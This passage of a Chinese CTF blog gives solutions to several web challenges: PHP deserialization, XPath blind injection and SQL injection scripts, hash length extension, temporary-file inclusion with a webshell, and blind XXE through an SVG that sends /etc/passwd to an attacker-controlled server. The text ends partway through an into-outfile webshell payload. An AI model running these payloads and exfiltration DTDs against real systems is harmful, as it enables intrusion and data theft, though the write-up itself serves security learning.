class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'source'</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@$ppp = unserialize($_GET[<span class=\"string\">\"data\"</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>两个对象创建和销毁时的魔术方法，将传入的data反序列化</p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>由<code>__destruct</code>方法可知，会输出<code>$b($a)</code>，所以我们构造函数读取即可，用断言assert，<code>assert(phpinfo())</code>就是输出phpinfo()了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloPhp</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $a = <span class=\"string\">\"phpinfo()\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $b = <span class=\"string\">\"assert\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> HelloPhp;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($c);</span><br><span class=\"line\"><span class=\"comment\">//O:8:\"HelloPhp\":2:&#123;s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:4:\"eval\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>data传入即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154817.png\" alt=\"\"></p>\n<p>flag就在这里面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154914.png\" alt=\"\"></p>\n<h3 id=\"ezlogin\"><a href=\"#ezlogin\" class=\"headerlink\" title=\"ezlogin\"></a>ezlogin</h3><p>首页是一个登录框，session存在期限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711175219.png\" alt=\"\"></p>\n<p>抓包重放，同样重放后session失效，应当是设置了csrf-token</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711180024.png\" alt=\"\"></p>\n<h4 id=\"考点：xpath注入\"><a href=\"#考点：xpath注入\" class=\"headerlink\" title=\"考点：xpath注入\"></a>考点：xpath注入</h4><p>参考原文地址：<a href=\"https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/\" target=\"_blank\" rel=\"noopener\">Tr0y’s Blog</a></p>\n<p>总结一下：</p>\n<p>xpath 是一门在 XML 文档中查找信息的语言。xpath注入主要分为常规注入和布尔盲注</p>\n<p>查询语句如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>常规注入如下：</p>\n<p>构造万能密码传入如<code>admin&#39; or &#39;1</code>：(已知admin用户)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39; or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>或者<code>&#39; or 1 or &#39;1</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&#39; or 1 or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>或节点遍历<code>admin&#39;] | //* | //*[&#39;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>ps：xpath 没有注释一说，所以 payload 要自行构造闭合原语句。</p>\n<p>布尔盲注payload用法主要如下：</p>\n<table>\n<thead>\n<tr>\n<th>payload</th>\n<th align=\"center\">含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>‘ or count(/)=<strong>1-&gt;n</strong> or ‘1</td>\n<td align=\"center\">判断根节点数量（n即是根节点的数目）</td>\n</tr>\n<tr>\n<td>‘ or string-length(name(/*[<strong>1-&gt;n</strong>]))=<strong>1-&gt;n</strong> or ‘1</td>\n<td align=\"center\">获取第n个节点的名字长度n</td>\n</tr>\n<tr>\n<td>‘ or substring(name(/*[<strong>1-&gt;n</strong>]), 1, 1)=’<strong>测试字符</strong>‘ or ‘1</td>\n<td align=\"center\">逐位获取第n个节点名</td>\n</tr>\n</tbody></table>\n<h4 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>使用<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>猜测根节点字符</p>\n<p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>时</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192100.png\" alt=\"\"></p>\n<p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;r&#39; or &#39;1</code>时</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192120.png\" alt=\"\"></p>\n<p>非法操作，则说明根节点的第一个字符是’r’</p>\n<p>编写脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url =<span class=\"string\">'http://e2f677a1-4672-4581-81d4-2e82706d0738.node3.buuoj.cn/login.php'</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\">head =&#123;</span><br><span class=\"line\">    <span class=\"string\">\"User-Agent\"</span>: <span class=\"string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Content-Type\"</span>: <span class=\"string\">\"application/xml\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">find =re.compile(<span class=\"string\">'&lt;input type=\"hidden\" id=\"token\" value=\"(.*?)\" /&gt;'</span>)<span class=\"comment\">#匹配页面token</span></span><br><span class=\"line\"></span><br><span class=\"line\">strs =<span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag =<span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    print(<span class=\"string\">'------------------'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> strs:</span><br><span class=\"line\">        r = s.post(url=url)</span><br><span class=\"line\">        token = find.findall(r.text)</span><br><span class=\"line\">        <span class=\"comment\">#猜测根节点名称</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"&lt;username&gt;' or substring(name(/*[1]),&#123;&#125;, 1)='&#123;&#125;' or '1&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;\"</span>.format(i,j,token[<span class=\"number\">0</span>])</span><br><span class=\"line\">        r = s.post(url=url,headers=head,data=payload)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"非法操作\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            flag+=j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711204336.png\" alt=\"\"></p>\n<p>接下来依次跑根节点以下的子节点，直到跑到username和password，替换payload即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> #猜测子节点名称</span><br><span class=\"line\"> payload_2 &#x3D; &quot;&lt;username&gt;&#39; or substring(name(&#x2F;root&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class=\"line\"> </span><br><span class=\"line\"> #猜测accounts的节点</span><br><span class=\"line\">payload_3 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class=\"line\"></span><br><span class=\"line\">#猜测user节点</span><br><span class=\"line\">payload_4 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;user&#x2F;*[2]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class=\"line\"></span><br><span class=\"line\">#跑用户名和密码</span><br><span class=\"line\">payload_username &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;username&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class=\"line\"></span><br><span class=\"line\">payload_password &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;password&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br></pre></td></tr></table></figure>\n\n<p>最后得到username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f，password解码md5得gtfly123</p>\n<p>登录会闪过一句话，抓包截下来是一串base64<code>ZmxhZyBpcyBpbiAvZmxhZwo=</code>解码得flag is in /flag</p>\n<p>url是<code>admin.php?file=welcome</code>，尝试php://filter读取，发现php和base被过滤，大小写绕过</p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711211139.png\" alt=\"\"></p>\n<h3 id=\"ezinclude\"><a href=\"#ezinclude\" class=\"headerlink\" title=\"ezinclude\"></a>ezinclude</h3><p>打开靶机只有<code>username/password error</code>，源码处发现注释</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712095830.png\" alt=\"\"></p>\n<p>随便传两个值抓包回放</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104248.png\" alt=\"\"></p>\n<h4 id=\"考点1：哈希长度拓展攻击\"><a href=\"#考点1：哈希长度拓展攻击\" class=\"headerlink\" title=\"考点1：哈希长度拓展攻击\"></a>考点1：哈希长度拓展攻击</h4><p>哈希长度拓展攻击是利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。 </p>\n<p>可以使用工具hashpump构造payload，用法如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104552.png\" alt=\"\"></p>\n<p>官方wp是说可以爆破secret的长度，但这题直接给出了Md5后的hash<code>973225ae4fc8977f86d1a330b0774630</code>，也就是pass。。。。</p>\n<p>那么直接传，发现有跳转flflflflag.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105001.png\" alt=\"\"></p>\n<p>打开页面告诉不是flag并存在包含</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105100.png\" alt=\"\"></p>\n<p>可以利用伪协议读取源码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712110818.png\" alt=\"\"></p>\n<p>再扫一下目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114201.png\" alt=\"\"></p>\n<p>config.php还是告诉flag不在这里，dir.php列出了根目录下的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111401.png\" alt=\"\"></p>\n<h4 id=\"考点2：临时文件包含（-php-7-Segment-Fault-）\"><a href=\"#考点2：临时文件包含（-php-7-Segment-Fault-）\" class=\"headerlink\" title=\"考点2：临时文件包含（ php 7 Segment Fault ）\"></a>考点2：临时文件包含（ php 7 Segment Fault ）</h4><p>php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除</p>\n<p>参考文章：<a href=\"https://www.anquanke.com/post/id/201136#h2-11\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/201136#h2-11</a></p>\n<p>构造上传表单</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://22a3b9e5-eb32-4c8e-b130-54e4a5beb8df.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"filename\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>上传一句话文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111918.png\" alt=\"\"></p>\n<p>查看dir.php，我这试了两次</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114122.png\" alt=\"\"></p>\n<p>查看文件是否包含成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712113629.png\" alt=\"\"></p>\n<p>包含文件连接shell查看即可，flag就在phpinfo里</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712132804.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["bypass","serialize","xpath","hashpump"]},{"title":"DozerCTF2020部分web复现","url":"/2020/06/20/DozerCTF_web_wp/","content":"<p>前几天打的比赛，web只做出了两道签到题，域渗透的题暂且搁置，想着就把其他的web复现一下吧。</p>\n<p>平台：<a href=\"http://ctf.dozerjit.club:8000/\" target=\"_blank\" rel=\"noopener\">http://ctf.dozerjit.club:8000/</a></p>\n<a id=\"more\"></a>\n\n<h4 id=\"sqli-labs-0\"><a href=\"#sqli-labs-0\" class=\"headerlink\" title=\"sqli-labs 0\"></a>sqli-labs 0</h4><p>sql-labs改的题，试了很多种姿势都没让id报错，后来还是官方出了hint让尝试url二次编码(喷)才成功</p>\n<p><img src=\"/images/image-20200619153205929.png\" alt=\"image-20200619153205929\"></p>\n<p>之前在测试中发现select，union之类的都被过滤了，开始以为是盲注，所以写了个脚本出了数据库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">words = <span class=\"string\">\"Dumb\"</span></span><br><span class=\"line\">result = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    print(<span class=\"string\">'--------------------------'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">129</span>):</span><br><span class=\"line\">        url = <span class=\"string\">'http://118.31.11.216:30501/?id=1%2527/**/and/**/ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;'</span>.format(i,j)</span><br><span class=\"line\">        re=requests.get(url+<span class=\"string\">'%2523'</span>).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> words <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> re:</span><br><span class=\"line\">            result+=chr(j)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200619153929460.png\" alt=\"image-20200619153929460\"></p>\n<p>但后来继续跑的时候老报错，仔细看了fuzz才发现点号<code>.</code>被过滤了。。。。。那么啥都不能用了，只剩个网鼎2018的堆叠注入。</p>\n<p><img src=\"/images/image-20200619154141735.png\" alt=\"image-20200619154141735\"></p>\n<p>然后尝试过比如重命名的payload不知道为啥没打通</p>\n<p>最后还是用了handler</p>\n<p><code>1%2527;handler uziuzi open as a;handler a read first;%2523</code></p>\n<p><img src=\"/images/image-20200619154316727.png\" alt=\"image-20200619154316727\"></p>\n<h4 id=\"白给的反序列化\"><a href=\"#白给的反序列化\" class=\"headerlink\" title=\"白给的反序列化\"></a>白给的反序列化</h4><p>打开靶机直接给出代码，审计一波</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">home</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $method;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $args;  <span class=\"comment\">//私有类型定义两个变量</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($method, $args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;method = $method;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;args = $args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array(<span class=\"keyword\">$this</span>-&gt;method, <span class=\"keyword\">array</span>(<span class=\"string\">\"mysys\"</span>))) &#123;  <span class=\"comment\">//当method为mysys时</span></span><br><span class=\"line\">            call_user_func_array(<span class=\"keyword\">array</span>(<span class=\"keyword\">$this</span>, <span class=\"keyword\">$this</span>-&gt;method), <span class=\"keyword\">$this</span>-&gt;args);</span><br><span class=\"line\">        &#125; <span class=\"comment\">//调用mysys函数，并把args作为mysys的数组参数回调</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mysys</span><span class=\"params\">($path)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        print_r(base64_encode(exec(<span class=\"string\">\"cat $path\"</span>)));</span><br><span class=\"line\">    &#125;<span class=\"comment\">//把结果base64编码打印</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strlen($str) &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"No\"</span>);</span><br><span class=\"line\">        &#125;<span class=\"comment\">//限制字符串长度</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $num = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;args <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;args[$k] = <span class=\"keyword\">$this</span>-&gt;waf(trim($v));</span><br><span class=\"line\">            $num += <span class=\"number\">1</span>;<span class=\"comment\">//遍历出$k和$v然后计算$v里的空格，大于2则die</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($num &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"No\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'path'</span>]) &#123;<span class=\"comment\">//如果传入path反序列化path</span></span><br><span class=\"line\">    $path = @$_GET[<span class=\"string\">'path'</span>];</span><br><span class=\"line\">    unserialize($path);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>虽然有两个waf，但其实限制并不生效，因为无论前面有没有die，析构函数<code>__destruct</code>最后都会触发，因此只要保证method是’mysys’，args为数组参数就可以了，还有就是由于method和args是私有类型，所以最后payload用url方式打印出即可</p>\n<p>exp:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">home</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $method=<span class=\"string\">'mysys'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $args=<span class=\"keyword\">array</span>(<span class=\"string\">'flag.php'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> home();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($a));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>\n\n<p>get传入后再base64解码一下即可</p>\n<p><img src=\"/images/image-20200619162357657.png\" alt=\"image-20200619162357657\"></p>\n<h4 id=\"svgggggg\"><a href=\"#svgggggg\" class=\"headerlink\" title=\"svgggggg!\"></a>svgggggg!</h4><p>这道题磨了好久还是没做出来。。。（菜到自闭）</p>\n<p>考点：bind xxe，ssrf</p>\n<p>打开靶机是个svg检验</p>\n<p><img src=\"/images/image-20200619162628192.png\" alt=\"image-20200619162628192\"></p>\n<p>访问目标除了svg文件都只会<code>Unauthorized type!</code></p>\n<p>bind xxe参考：<a href=\"freebuf.com/articles/web/177979.html\">XXE漏洞利用技巧：从XML到远程代码执行</a></p>\n<p>在ecs上构造两个文件：xxe.svg，xxe.dtd</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xxe.svg</span><br><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class=\"line\"> &lt;!DOCTYPE foo [  </span><br><span class=\"line\">   &lt;!ELEMENT svg ANY &gt;</span><br><span class=\"line\">   &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourip&#x2F;xxe.dtd&quot; &gt;</span><br><span class=\"line\">%remote;%data;</span><br><span class=\"line\">   ]&gt;</span><br><span class=\"line\">   &lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class=\"line\">   &amp;res;</span><br><span class=\"line\">   &lt;&#x2F;svg&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">xxe.dtd</span><br><span class=\"line\">&lt;!ENTITY % show SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class=\"line\">&lt;!ENTITY % data &quot;&lt;!ENTITY res SYSTEM &#39;http:&#x2F;&#x2F;yourip:your port&#x2F;?%show;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后建立一个http服务监听数据，</p>\n<p><img src=\"/images/image-20200619215906958.png\" alt=\"image-20200619215906958\"></p>\n<p>请求xxe.svg</p>\n<p><img src=\"/images/image-20200620102634408.png\" alt=\"image-20200620102634408\"></p>\n<p>可以看到已经读出来了/etc/passwd的内容</p>\n<p><img src=\"/images/image-20200619220044010.png\" alt=\"image-20200619220044010\"></p>\n<p>那么我们就可以开始读数据了，根据提示用户r1ck的历史操作我们读/home/r1ck/.bash_history文件内容</p>\n<p><img src=\"/images/image-20200619220254637.png\" alt=\"image-20200619220254637\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd &#x2F;app</span><br><span class=\"line\">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure>\n\n<p>得知在app目录下开启了一个php的web服务，那么读取index.php的源码</p>\n<p><img src=\"/images/image-20200620102802726.png\" alt=\"image-20200620102802726\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">Hi!</span><br><span class=\"line\">You Find Me .</span><br><span class=\"line\">Flag is nearby.</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\"></span><br><span class=\"line\">$conn&#x3D;mysql_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;);</span><br><span class=\"line\">mysql_select_db(&#39;security&#39;);</span><br><span class=\"line\"></span><br><span class=\"line\">if ($_GET[&#39;id&#39;])&#123;</span><br><span class=\"line\">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    $id &#x3D; 1;</span><br><span class=\"line\">$sql &#x3D; &quot;select * from user where id&#x3D;&#39;$id&#39;&quot;;</span><br><span class=\"line\">$result &#x3D; mysql_query($sql,$conn);</span><br><span class=\"line\">$arr &#x3D; mysql_fetch_assoc($result);</span><br><span class=\"line\">print_r($arr);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>存在sql注入，并且hint2提示直接getshell，可以union联合使用into outfile写入shell</p>\n<p><code>-1&#39; union select 1,&#39;&lt;?php system($_GET[cmd]);?&gt;&#39; into 